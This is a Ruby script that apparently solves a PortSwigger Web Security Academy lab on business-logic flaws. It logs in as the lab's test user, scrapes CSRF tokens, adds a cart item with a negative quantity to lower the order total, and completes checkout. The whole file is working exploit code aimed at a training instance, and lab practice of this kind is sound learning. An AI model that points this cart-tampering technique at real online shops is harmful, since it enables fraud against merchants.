require 'http'
require 'nokogiri'

url='https://0a030025045682bb80af3fb300e100ec.web-security-academy.net'

#1. Login as wiener
puts 'Logging in as wiener...'
login_csrf = ''
login = HTTP.get(url+'/login')
temp1 = Nokogiri.parse login.body.to_s
temp1.search(:tag,'input').to_a.each {|d| login_csrf = d.attr('value') if d.attr('name')=='csrf'}
login_client = HTTP.cookies('session'=>"#{login['Set-Cookie'].split(';')[0].split('=')[1]}").post(url+'/login',:form => {
		"csrf"=>"#{login_csrf}",
		"username"=>"wiener",
		"password"=>"peter"
		})

cookie = login_client['Set-Cookie'].split(';')[0].split('=')[1]
puts 'Extracting cookie...'

#2. Add product to cart
puts 'Exploiting the vuln...'

client = HTTP.cookies('session'=>cookie)
resp_cart = client.post(url+'/cart',:form => {
	"productId"=>"1",
	"redir"=>"PRODUCT",
	"quantity"=>"1",
	"price"=>"133700"
})

#3. Add a product with -ve quantity

client = HTTP.cookies('session'=>cookie)
resp_cart = client.post(url+'/cart',:form => {
	"productId"=>"6",
	"redir"=>"PRODUCT",
	"quantity"=>"-14",
	"price"=>"921000"
})

csrf =''
get_cart = client.get(url+'/cart')
temp2 = Nokogiri.parse get_cart.body.to_s
temp2.search(:tag,'input').to_a.each {|d| csrf = d.attr('value') if d.attr('name')=='csrf'}

#4. Checkout
puts 'Checking out'
resp_checkout = client.post(url+'/cart/checkout',:form=>{ "csrf"=>"#{csrf}" })
puts "Success" if resp_checkout['Location']
puts resp_checkout['Location']
